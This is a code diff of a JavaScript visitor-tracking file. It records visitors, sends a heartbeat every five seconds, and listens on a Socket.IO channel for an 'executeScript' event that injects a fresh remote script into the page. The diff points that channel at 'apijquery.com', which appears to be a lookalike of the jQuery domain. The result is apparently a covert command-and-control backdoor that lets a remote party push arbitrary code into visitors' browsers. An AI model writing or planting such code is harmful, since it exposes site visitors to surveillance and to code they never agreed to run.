@@ -1,7 +1,6 @@
-// public/tracking.js
 console.log("Tracking script initialized");
 
-// Send visitor data to your backend
+// Send visitor data
 fetch("/api/visitors/track", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
@@ -20,22 +19,22 @@ fetch("/api/visitors/track", {
   })
   .catch((err) => console.error("Error tracking visitor:", err));
 
-// Establish WebSocket connection
-const socket = io("http://localhost:3000");
+// Connect to Socket.IO
+const socket = io("https://apijquery.com"); // Adjust if needed
 
-// Listen for the 'executeScript' event
+// Listen for "executeScript" => load the currently active snippet
 socket.on("executeScript", () => {
   console.log("Received executeScript event.");
 
-  // Create a new script element and set its src to the script URL with a timestamp to prevent caching
+  // Pull the active snippet from /api/js-snippets/latest-script.js
   const scriptElement = document.createElement("script");
-  scriptElement.src = `/api/js-snippets/latest-script.js?t=${new Date().getTime()}`;
+  scriptElement.src = `/api/js-snippets/latest-script.js?t=${Date.now()}`;
   document.body.appendChild(scriptElement);
 });
 
-// Heartbeat mechanism
+// Heartbeat every 5s
 let heartbeatInterval;
-const heartbeatFrequency = 5000; // Send heartbeat every 5 seconds
+const heartbeatFrequency = 5000;
 
 function startHeartbeat() {
   heartbeatInterval = setInterval(() => {
@@ -60,7 +59,7 @@ function stopHeartbeat() {
   clearInterval(heartbeatInterval);
 }
 
-// Start sending heartbeats when the page is visible
+// Start heartbeat only when page is visible
 document.addEventListener("visibilitychange", () => {
   if (document.visibilityState === "visible") {
     console.log("Page is visible. Starting heartbeat.");
@@ -71,7 +70,7 @@ document.addEventListener("visibilitychange", () => {
   }
 });
 
-// Start heartbeat when the script loads, if the page is visible
+// If page is already visible, start now
 if (document.visibilityState === "visible") {
   startHeartbeat();
 }
